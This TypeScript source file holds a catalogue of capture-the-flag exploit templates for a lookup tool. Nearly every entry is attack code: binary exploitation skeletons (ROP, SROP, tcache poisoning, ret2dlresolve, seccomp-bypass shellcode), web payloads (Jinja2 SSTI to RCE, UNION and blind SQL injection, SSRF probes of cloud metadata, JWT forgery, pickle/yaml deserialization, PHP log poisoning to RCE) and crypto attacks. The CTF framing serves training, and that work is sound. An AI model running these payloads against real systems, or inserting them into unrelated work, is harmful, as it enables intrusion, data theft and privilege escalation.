export type ExploitTemplateDomain = "PWN" | "CRYPTO" | "WEB" | "REV" | "FORENSICS";

export interface ExploitTemplateEntry {
  domain: ExploitTemplateDomain;
  id: string;
  title: string;
  body: string;
}

const TEMPLATES: ExploitTemplateEntry[] = [
  {
    domain: "PWN",
    id: "pwntools-skeleton",
    title: "Pwntools exploit skeleton (local/remote)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "context.log_level = 'info'",
      "",
      "HOST = '127.0.0.1'",
      "PORT = 1337",
      "",
      "def start(argv=[]):",
      "    if args.REMOTE:",
      "        return remote(HOST, PORT)",
      "    return process([elf.path] + argv)",
      "",
      "io = start()",
      "",
      "# TODO: trigger bug, get primitive (leak/write/control)",
      "# TODO: build payload",
      "",
      "io.interactive()",
      "```",
      "",
      "Run:",
      "- local: python3 exp.py",
      "- remote: python3 exp.py REMOTE",
    ].join("\n"),
  },
  {
    domain: "PWN",
    id: "ret2libc-outline",
    title: "ret2libc outline (leak -> libc base -> system)",
    body: [
      "```text",
      "1) Leak a libc address (puts/printf/read/write) via GOT or stack.",
      "2) Compute libc_base = leaked - libc.symbols[<fn>].",
      "3) system = libc_base + libc.symbols['system'].",
      "4) binsh = libc_base + next(libc.search(b'/bin/sh\\x00')).",
      "5) Build ROP: ret (stack align if needed) -> system(binsh).",
      "6) Verify deterministically: repeat run, then remote parity.",
      "```",
    ].join("\n"),
  },
  {
    domain: "CRYPTO",
    id: "padding-oracle-loop",
    title: "Padding oracle loop skeleton (bytewise)",
    body: [
      "```python",
      "# Skeleton: adapt to your oracle and block mode.",
      "# Goal: recover plaintext or forge a valid ciphertext using a padding oracle.",
      "",
      "def oracle(ciphertext: bytes) -> bool:",
      "    \"\"\"Return True iff padding is valid (or error differs).\"\"\"",
      "    raise NotImplementedError",
      "",
      "def split_blocks(data: bytes, bs: int) -> list[bytes]:",
      "    return [data[i:i+bs] for i in range(0, len(data), bs)]",
      "",
      "# TODO: implement bytewise attack for your protocol",
      "```",
    ].join("\n"),
  },
  {
    domain: "CRYPTO",
    id: "ecb-byte-at-a-time",
    title: "ECB byte-at-a-time outline (oracle)",
    body: [
      "```text",
      "1) Confirm ECB: identical blocks => identical ciphertext blocks.",
      "2) Find block size by measuring ciphertext length steps.",
      "3) For each unknown byte: craft prefix so next unknown byte aligns at block end.",
      "4) Build dictionary of 256 candidates; match oracle output block.",
      "5) Stop-loss: if mismatch, re-check padding/encoding/normalization assumptions.",
      "```",
    ].join("\n"),
  },
  {
    domain: "PWN",
    id: "format-string-leak",
    title: "Format string leak + write skeleton (%p / %n)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "HOST, PORT = '127.0.0.1', 1337",
      "",
      "def start():",
      "    return remote(HOST, PORT) if args.REMOTE else process(elf.path)",
      "",
      "def leak_stack(io):",
      "    # TODO: adjust menu prompt and count of leaked slots",
      "    io.sendlineafter(b'> ', b'%p|' * 16)",
      "    line = io.recvline(timeout=2) or b''",
      "    leaks = [x for x in line.strip().split(b'|') if x.startswith(b'0x')]",
      "    return leaks",
      "",
      "def fsb_write_payload(where: int, value: int, offset: int) -> bytes:",
      "    # TODO: adapt byte/short/int write strategy for target",
      "    return fmtstr_payload(offset, {where: value}, write_size='short')",
      "",
      "io = start()",
      "leaks = leak_stack(io)",
      "# TODO: parse PIE/libc/canary from leaks and compute target addr",
      "# payload = fsb_write_payload(target_addr, target_value, offset=6)",
      "# io.sendlineafter(b'> ', payload)",
      "io.interactive()",
      "```",
    ].join("\n"),
  },
  {
    domain: "PWN",
    id: "heap-tcache-poison",
    title: "Heap tcache poisoning (double-free -> arbitrary write)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "",
      "def alloc(io, idx: int, size: int, data: bytes):",
      "    io.sendlineafter(b'> ', b'1')",
      "    io.sendlineafter(b'idx: ', str(idx).encode())",
      "    io.sendlineafter(b'size: ', str(size).encode())",
      "    io.sendafter(b'data: ', data)",
      "",
      "def free(io, idx: int):",
      "    io.sendlineafter(b'> ', b'2')",
      "    io.sendlineafter(b'idx: ', str(idx).encode())",
      "",
      "def edit(io, idx: int, data: bytes):",
      "    io.sendlineafter(b'> ', b'3')",
      "    io.sendlineafter(b'idx: ', str(idx).encode())",
      "    io.sendafter(b'data: ', data)",
      "",
      "io = process(elf.path)",
      "",
      "# 1) Fill tcache bin and create double-free primitive",
      "alloc(io, 0, 0x60, b'A' * 8)",
      "alloc(io, 1, 0x60, b'B' * 8)",
      "free(io, 0)",
      "free(io, 1)",
      "free(io, 0)  # double free",
      "",
      "# 2) Poison fd pointer to target-0x10 (glibc version dependent)",
      "target = elf.got.get('free', 0)",
      "edit(io, 0, p64(target))",
      "",
      "# 3) Allocate chunks to land controlled pointer at target",
      "alloc(io, 2, 0x60, b'C' * 8)",
      "alloc(io, 3, 0x60, b'D' * 8)",
      "alloc(io, 4, 0x60, p64(elf.symbols.get('win', 0)))",
      "",
      "# TODO: trigger hijacked function pointer/hook",
      "io.interactive()",
      "```",
    ].join("\n"),
  },
  {
    domain: "PWN",
    id: "rop-chain-builder",
    title: "ROP chain builder with gadget placeholders",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "rop = ROP(elf)",
      "offset =  cyclic_find(0x6161616c)  # TODO: replace with real crash value",
      "",
      "# TODO: replace with discovered gadgets from ROPgadget/ropper",
      "pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]",
      "ret = rop.find_gadget(['ret'])[0]",
      "",
      "payload = flat(",
      "    b'A' * offset,",
      "    ret,  # stack alignment for libc calls",
      "    pop_rdi,",
      "    next(elf.search(b'/bin/sh\\x00')),  # or libc search after leak",
      "    elf.plt.get('system', 0),",
      ")",
      "",
      "# TODO: send payload through vulnerable input path",
      "```",
    ].join("\n"),
  },
  {
    domain: "PWN",
    id: "srop-sigreturn",
    title: "SROP sigreturn frame template (execve/orw)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.arch = 'amd64'",
      "context.binary = elf = ELF('./chall')",
      "",
      "io = process(elf.path)",
      "",
      "syscall_ret = 0x0  # TODO: gadget: syscall; ret",
      "pop_rax = 0x0      # TODO: gadget: pop rax; ret",
      "binsh = 0x0        # TODO: writable addr containing b'/bin/sh\\x00'",
      "",
      "frame = SigreturnFrame()",
      "frame.rax = 59   # execve",
      "frame.rdi = binsh",
      "frame.rsi = 0",
      "frame.rdx = 0",
      "frame.rip = syscall_ret",
      "",
      "payload = flat(",
      "    b'A' * 0x100,  # TODO: overflow offset",
      "    pop_rax,",
      "    15,            # rt_sigreturn syscall number",
      "    syscall_ret,",
      "    bytes(frame),",
      ")",
      "",
      "io.send(payload)",
      "io.interactive()",
      "```",
    ].join("\n"),
  },
  {
    domain: "PWN",
    id: "ret2dlresolve",
    title: "ret2dlresolve template (arbitrary resolver call)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "io = process(elf.path)",
      "rop = ROP(elf)",
      "offset = 0x100  # TODO: overflow offset",
      "",
      "dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])",
      "bss_addr = elf.bss() + 0x800",
      "",
      "# Stage 1: read fake structures into memory",
      "rop.read(0, bss_addr, len(dl.payload))",
      "rop.ret2dlresolve(dl, bss_addr)",
      "",
      "payload = flat({offset: rop.chain()})",
      "io.send(payload)",
      "io.send(dl.payload)",
      "io.interactive()",
      "```",
    ].join("\n"),
  },
  {
    domain: "PWN",
    id: "seccomp-bypass-orw",
    title: "seccomp bypass via ORW shellcode (open/read/write)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.arch = 'amd64'",
      "context.binary = elf = ELF('./chall')",
      "io = process(elf.path)",
      "",
      "flag_path = b'/flag\\x00'",
      "",
      "sc = asm(f'''",
      "    mov rax, 2                /* open */",
      "    lea rdi, [rip+path]",
      "    xor rsi, rsi",
      "    xor rdx, rdx",
      "    syscall",
      "    mov rdi, rax              /* fd */",
      "    mov rax, 0                /* read */",
      "    mov rsi, rsp",
      "    mov rdx, 0x100",
      "    syscall",
      "    mov rdx, rax              /* nbytes */",
      "    mov rax, 1                /* write */",
      "    mov rdi, 1",
      "    mov rsi, rsp",
      "    syscall",
      "    jmp done",
      "path:",
      "    .ascii \"/flag\\x00\"",
      "done:",
      "''')",
      "",
      "# TODO: use RWX region, mprotect, or stack pivot to run shellcode",
      "io.send(sc)",
      "io.interactive()",
      "```",
    ].join("\n"),
  },
  {
    domain: "WEB",
    id: "ssti-jinja2",
    title: "Jinja2 SSTI probe and RCE payload workflow",
    body: [
      "```python",
      "import requests",
      "",
      "URL = 'http://target/render'",
      "PARAM = 'name'",
      "",
      "probes = [",
      "    '{{7*7}}',",
      "    '{{config.items()}}',",
      "    \"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\"",
      "]",
      "",
      "for p in probes:",
      "    r = requests.get(URL, params={PARAM: p}, timeout=8)",
      "    print('payload=', p)",
      "    print('status=', r.status_code)",
      "    print('body[:200]=', r.text[:200])",
      "    print('-' * 40)",
      "",
      "# TODO: adapt context variable path (config/request/self) to app version",
      "```",
    ].join("\n"),
  },
  {
    domain: "WEB",
    id: "sqli-union",
    title: "UNION-based SQLi extraction skeleton",
    body: [
      "```python",
      "import requests",
      "",
      "BASE = 'http://target/products'",
      "PARAM = 'id'",
      "",
      "def send(payload: str):",
      "    return requests.get(BASE, params={PARAM: payload}, timeout=8)",
      "",
      "# 1) Find column count",
      "for i in range(1, 11):",
      "    r = send(f\"1 ORDER BY {i}-- -\")",
      "    print(i, r.status_code)",
      "",
      "# 2) Identify printable columns",
      "payload = \"-1 UNION ALL SELECT 1,2,3,4-- -\"  # TODO: adjust column count",
      "r = send(payload)",
      "print(r.text[:300])",
      "",
      "# 3) Extract DB metadata",
      "payload = \"-1 UNION ALL SELECT database(),user(),version(),4-- -\"",
      "print(send(payload).text[:500])",
      "",
      "# TODO: enumerate tables/columns for target DB flavor",
      "```",
    ].join("\n"),
  },
  {
    domain: "WEB",
    id: "sqli-blind-boolean",
    title: "Boolean-based blind SQLi script template",
    body: [
      "```python",
      "import requests",
      "import string",
      "",
      "URL = 'http://target/item'",
      "PARAM = 'id'",
      "TRUE_MARKER = 'Welcome'  # TODO: marker that appears only on true",
      "",
      "def is_true(condition: str) -> bool:",
      "    payload = f\"1' AND ({condition})-- -\"",
      "    r = requests.get(URL, params={PARAM: payload}, timeout=8)",
      "    return TRUE_MARKER in r.text",
      "",
      "def extract_value(sql_expr: str, max_len: int = 64) -> str:",
      "    alphabet = string.ascii_letters + string.digits + '_{}-@.:$'",
      "    out = ''",
      "    for pos in range(1, max_len + 1):",
      "        found = False",
      "        for ch in alphabet:",
      "            cond = f\"substr(({sql_expr}),{pos},1)='{ch}'\"",
      "            if is_true(cond):",
      "                out += ch",
      "                found = True",
      "                break",
      "        if not found:",
      "            break",
      "    return out",
      "",
      "print(extract_value('select database()'))",
      "```",
    ].join("\n"),
  },
  {
    domain: "WEB",
    id: "ssrf-basic",
    title: "Basic SSRF exploitation and bypass checklist",
    body: [
      "```python",
      "import requests",
      "",
      "ENDPOINT = 'http://target/fetch'",
      "PARAM = 'url'",
      "",
      "targets = [",
      "    'http://127.0.0.1:80/',",
      "    'http://localhost/',",
      "    'http://169.254.169.254/latest/meta-data/',",
      "    'http://[::1]/',",
      "    'http://2130706433/',  # 127.0.0.1 as decimal",
      "]",
      "",
      "for t in targets:",
      "    r = requests.get(ENDPOINT, params={PARAM: t}, timeout=8)",
      "    print(t, r.status_code, len(r.text))",
      "",
      "# TODO: try redirects, DNS rebinding, userinfo (@), mixed schemes (gopher/file)",
      "```",
      "",
      "```text",
      "1) Compare response size/status/timing to detect internal access.",
      "2) Probe cloud metadata endpoints and internal admin panels.",
      "3) If URL validation exists, test parser confusion (\"http://allowed@127.0.0.1\").",
      "4) Pivot to exfiltration: SSRF -> internal token/API key -> privileged action.",
      "```",
    ].join("\n"),
  },
  {
    domain: "WEB",
    id: "jwt-forgery",
    title: "JWT forgery (none alg + key confusion) template",
    body: [
      "```python",
      "import base64",
      "import json",
      "import hmac",
      "import hashlib",
      "",
      "def b64u(data: bytes) -> bytes:",
      "    return base64.urlsafe_b64encode(data).rstrip(b'=')",
      "",
      "# Attack 1: alg=none",
      "header_none = b64u(json.dumps({'typ': 'JWT', 'alg': 'none'}).encode())",
      "payload = b64u(json.dumps({'sub': 'admin', 'role': 'admin'}).encode())",
      "token_none = b'.'.join([header_none, payload, b'']).decode()",
      "print('none token:', token_none)",
      "",
      "# Attack 2: HS256 key confusion with exposed RSA public key",
      "public_key = b'-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----\\n'",
      "header_hs = b64u(json.dumps({'typ': 'JWT', 'alg': 'HS256'}).encode())",
      "msg = b'.'.join([header_hs, payload])",
      "sig = hmac.new(public_key, msg, hashlib.sha256).digest()",
      "token_confusion = b'.'.join([header_hs, payload, b64u(sig)]).decode()",
      "print('key-confusion token:', token_confusion)",
      "",
      "# TODO: send token via Authorization: Bearer <token> and verify privilege escalation",
      "```",
    ].join("\n"),
  },
  {
    domain: "WEB",
    id: "deserialization-python",
    title: "Python deserialization (pickle/yaml) exploit skeleton",
    body: [
      "```python",
      "import base64",
      "import pickle",
      "import os",
      "",
      "class RCE:",
      "    def __reduce__(self):",
      "        # TODO: replace command with controlled callback/exfil action",
      "        return (os.system, ('id',))",
      "",
      "payload = pickle.dumps(RCE(), protocol=4)",
      "print('pickle_b64=', base64.b64encode(payload).decode())",
      "",
      "yaml_payload = \"!!python/object/apply:os.system ['id']\"",
      "print('yaml=', yaml_payload)",
      "",
      "# TODO: deliver payload to vulnerable pickle.loads / yaml.load (unsafe loader)",
      "```",
    ].join("\n"),
  },
  {
    domain: "WEB",
    id: "lfi-to-rce",
    title: "LFI -> RCE via log poisoning/filter chains",
    body: [
      "```python",
      "import requests",
      "",
      "BASE = 'http://target/index.php'",
      "LFI_PARAM = 'page'",
      "",
      "# 1) Poison access log with PHP payload",
      "php_payload = '<?php system($_GET[\"cmd\"]); ?>'",
      "requests.get(BASE, headers={'User-Agent': php_payload}, timeout=8)",
      "",
      "# 2) Include poisoned log file through LFI",
      "log_paths = [",
      "    '/var/log/apache2/access.log',",
      "    '/var/log/nginx/access.log',",
      "]",
      "",
      "for lp in log_paths:",
      "    r = requests.get(BASE, params={LFI_PARAM: lp, 'cmd': 'id'}, timeout=8)",
      "    if 'uid=' in r.text:",
      "        print('RCE via', lp)",
      "        print(r.text[:300])",
      "",
      "# TODO: if wrappers enabled, test php://filter and data:// for alternative chains",
      "```",
    ].join("\n"),
  },
  {
    domain: "CRYPTO",
    id: "rsa-small-e-coppersmith",
    title: "RSA small-e attack with Coppersmith setup",
    body: [
      "```python",
      "# Requires SageMath environment",
      "from sageall import *",
      "",
      "# Given: c = (m)^e mod N, and m has known prefix",
      "N = Integer(0)   # TODO",
      "e = Integer(3)",
      "c = Integer(0)   # TODO",
      "known = b'flag{'",
      "unknown_len = 40  # TODO bytes",
      "",
      "PR.<x> = PolynomialRing(Zmod(N))",
      "m = Integer.from_bytes(known, 'big') * 256**unknown_len + x",
      "f = (m**e - c).monic()",
      "",
      "# beta/epsilon/X depend on bound assumptions",
      "X = 2**(8 * unknown_len)",
      "roots = f.small_roots(X=X, beta=1, epsilon=1/20)",
      "if roots:",
      "    r = int(roots[0])",
      "    rec = int(m(x=r)).to_bytes((int(m(x=r)).bit_length() + 7) // 8, 'big')",
      "    print(rec)",
      "```",
    ].join("\n"),
  },
  {
    domain: "CRYPTO",
    id: "rsa-common-modulus",
    title: "RSA common modulus attack template",
    body: [
      "```python",
      "from math import gcd",
      "",
      "def egcd(a, b):",
      "    if b == 0:",
      "        return (a, 1, 0)",
      "    g, x1, y1 = egcd(b, a % b)",
      "    return (g, y1, x1 - (a // b) * y1)",
      "",
      "def modinv(a, n):",
      "    g, x, _ = egcd(a, n)",
      "    if g != 1:",
      "        raise ValueError('not invertible')",
      "    return x % n",
      "",
      "N = 0      # TODO",
      "e1 = 0     # TODO",
      "e2 = 0     # TODO",
      "c1 = 0     # TODO",
      "c2 = 0     # TODO",
      "",
      "g, a, b = egcd(e1, e2)",
      "if g != 1:",
      "    raise ValueError('exponents must be coprime for basic variant')",
      "",
      "if a < 0:",
      "    c1 = modinv(c1, N)",
      "    a = -a",
      "if b < 0:",
      "    c2 = modinv(c2, N)",
      "    b = -b",
      "",
      "m = (pow(c1, a, N) * pow(c2, b, N)) % N",
      "print(m.to_bytes((m.bit_length() + 7) // 8, 'big'))",
      "```",
    ].join("\n"),
  },
  {
    domain: "CRYPTO",
    id: "aes-cbc-bitflip",
    title: "AES-CBC bit flipping attack template",
    body: [
      "```python",
      "# Goal: modify plaintext block P_i by flipping bytes in C_{i-1}",
      "from binascii import hexlify",
      "",
      "def bitflip(prev_ct: bytes, known_plain: bytes, desired_plain: bytes) -> bytes:",
      "    if not (len(prev_ct) == len(known_plain) == len(desired_plain)):",
      "        raise ValueError('block lengths must match')",
      "    out = bytearray(prev_ct)",
      "    for i in range(len(out)):",
      "        out[i] ^= known_plain[i] ^ desired_plain[i]",
      "    return bytes(out)",
      "",
      "# Example customization",
      "orig_prev = bytes.fromhex('00' * 16)  # TODO intercepted C_{i-1}",
      "known = b'role=user;uid=1' + b'\\x00'",
      "want = b'role=admin;uid=1'",
      "new_prev = bitflip(orig_prev, known, want)",
      "print('new_prev_hex=', hexlify(new_prev).decode())",
      "",
      "# TODO: replace block in ciphertext and submit token/cookie",
      "```",
    ].join("\n"),
  },
  {
    domain: "CRYPTO",
    id: "hash-length-extension",
    title: "Hash length extension attack skeleton",
    body: [
      "```python",
      "# pip install hashpumpy",
      "import hashpumpy",
      "",
      "orig_data = 'user=guest&admin=0'",
      "orig_sig = '0123456789abcdef0123456789abcdef'  # TODO known MAC",
      "append_data = '&admin=1'",
      "",
      "for key_len in range(8, 65):",
      "    new_sig, new_data = hashpumpy.hashpump(orig_sig, orig_data, append_data, key_len)",
      "    # TODO: submit new_data/new_sig to verifier endpoint",
      "    # if accepted: print(key_len, new_sig, repr(new_data)); break",
      "",
      "# Note: applicable to Merkle-Damgard hashes (MD5/SHA1/SHA256 naive prefix-MAC)",
      "```",
    ].join("\n"),
  },
  {
    domain: "REV",
    id: "angr-symbolic-exec",
    title: "angr symbolic execution solve skeleton",
    body: [
      "```python",
      "import angr",
      "import claripy",
      "",
      "BINARY = './chall'",
      "proj = angr.Project(BINARY, auto_load_libs=False)",
      "",
      "arg_len = 32  # TODO",
      "sym_arg = claripy.BVS('sym_arg', arg_len * 8)",
      "state = proj.factory.full_init_state(args=[BINARY, sym_arg])",
      "",
      "# Restrict charset for speed and realistic input",
      "for i in range(arg_len):",
      "    ch = sym_arg.get_byte(i)",
      "    state.solver.add(ch >= 0x20, ch <= 0x7e)",
      "",
      "simgr = proj.factory.simgr(state)",
      "FIND = 0x401234  # TODO success address",
      "AVOID = [0x401111]  # TODO fail addresses",
      "simgr.explore(find=FIND, avoid=AVOID)",
      "",
      "if simgr.found:",
      "    found = simgr.found[0]",
      "    model = found.solver.eval(sym_arg, cast_to=bytes)",
      "    print(model)",
      "```",
    ].join("\n"),
  },
  {
    domain: "REV",
    id: "z3-constraint-solver",
    title: "z3 constraint solver template",
    body: [
      "```python",
      "from z3 import *",
      "",
      "s = Solver()",
      "chars = [BitVec(f'c{i}', 8) for i in range(32)]  # TODO length",
      "",
      "for c in chars:",
      "    s.add(c >= 0x20, c <= 0x7e)",
      "",
      "# TODO: translate checks from disassembly/decompiler",
      "# Example constraints:",
      "s.add(chars[0] == ord('f'))",
      "s.add(chars[1] == ord('l'))",
      "s.add(chars[2] == ord('a'))",
      "s.add(chars[3] == ord('g'))",
      "s.add(Sum([ZeroExt(24, c) for c in chars[:8]]) == 700)",
      "",
      "if s.check() == sat:",
      "    m = s.model()",
      "    out = bytes([m[c].as_long() for c in chars])",
      "    print(out)",
      "else:",
      "    print('unsat')",
      "```",
    ].join("\n"),
  },
  {
    domain: "REV",
    id: "frida-hook-skeleton",
    title: "Frida hook skeleton for runtime inspection",
    body: [
      "```javascript",
      "// Run: frida -f ./chall -l hook.js --no-pause",
      "",
      "const target = Module.findExportByName(null, 'strcmp');",
      "if (target) {",
      "  Interceptor.attach(target, {",
      "    onEnter(args) {",
      "      this.a0 = Memory.readUtf8String(args[0]);",
      "      this.a1 = Memory.readUtf8String(args[1]);",
      "      send({ event: 'strcmp_enter', a0: this.a0, a1: this.a1 });",
      "    },",
      "    onLeave(retval) {",
      "      send({ event: 'strcmp_leave', ret: retval.toInt32() });",
      "    },",
      "  });",
      "}",
      "",
      "// TODO: hook custom function by address (Module.base.add(offset))",
      "```",
      "",
      "```python",
      "# Optional host script to collect Frida messages",
      "import frida, sys",
      "",
      "def on_message(msg, data):",
      "    print(msg)",
      "",
      "session = frida.spawn(['./chall'])",
      "sess = frida.attach(session)",
      "with open('hook.js', 'r', encoding='utf-8') as f:",
      "    script = sess.create_script(f.read())",
      "script.on('message', on_message)",
      "script.load()",
      "frida.resume(session)",
      "sys.stdin.read()",
      "```",
    ].join("\n"),
  },
  {
    domain: "FORENSICS",
    id: "volatility3-workflow",
    title: "Volatility 3 memory forensics workflow",
    body: [
      "```text",
      "1) Identify image info/profile hints:",
      "   python3 vol.py -f memdump.raw windows.info",
      "",
      "2) Enumerate processes and suspicious parent-child chains:",
      "   python3 vol.py -f memdump.raw windows.pslist",
      "   python3 vol.py -f memdump.raw windows.pstree",
      "",
      "3) Inspect command lines and loaded modules:",
      "   python3 vol.py -f memdump.raw windows.cmdline",
      "   python3 vol.py -f memdump.raw windows.dlllist --pid <PID>",
      "",
      "4) Network and handles triage:",
      "   python3 vol.py -f memdump.raw windows.netscan",
      "   python3 vol.py -f memdump.raw windows.handles --pid <PID>",
      "",
      "5) Extract memory artifacts:",
      "   python3 vol.py -f memdump.raw windows.memdump --pid <PID> --dump-dir dumps/",
      "   python3 vol.py -f memdump.raw windows.filescan",
      "",
      "6) Hunt credentials/flags with strings + yara on dumps directory.",
      "```",
    ].join("\n"),
  },
  {
    domain: "FORENSICS",
    id: "steganography-pipeline",
    title: "Steganography analysis pipeline (LSB/zsteg/steghide)",
    body: [
      "```text",
      "1) File triage:",
      "   file sample.png",
      "   exiftool sample.png",
      "   binwalk -e sample.png",
      "",
      "2) Metadata and raw strings:",
      "   strings -n 6 sample.png | tee strings.txt",
      "   xxd sample.png | head",
      "",
      "3) PNG/BMP LSB extraction:",
      "   zsteg -a sample.png",
      "   zsteg sample.png -E b1,r,lsb > lsb_r_b1.bin",
      "",
      "4) Steghide attempt (jpeg/wav commonly):",
      "   steghide info sample.jpg",
      "   steghide extract -sf sample.jpg -p '<password>'",
      "",
      "5) Visual channel splitting:",
      "   python3 -m PIL sample.png  # TODO: write script to split RGB/alpha and inspect",
      "",
      "6) If archive recovered, validate with file/unzip/7z and recurse.",
      "```",
    ].join("\n"),
  },
];

export function listExploitTemplates(domain?: ExploitTemplateDomain): Array<Omit<ExploitTemplateEntry, "body">> {
  return TEMPLATES.filter((t) => (domain ? t.domain === domain : true)).map(({ body: _body, ...rest }) => rest);
}

export function getExploitTemplate(domain: ExploitTemplateDomain, id: string): ExploitTemplateEntry | null {
  const normalizedId = id.trim();
  if (!normalizedId) {
    return null;
  }
  return TEMPLATES.find((t) => t.domain === domain && t.id === normalizedId) ?? null;
}
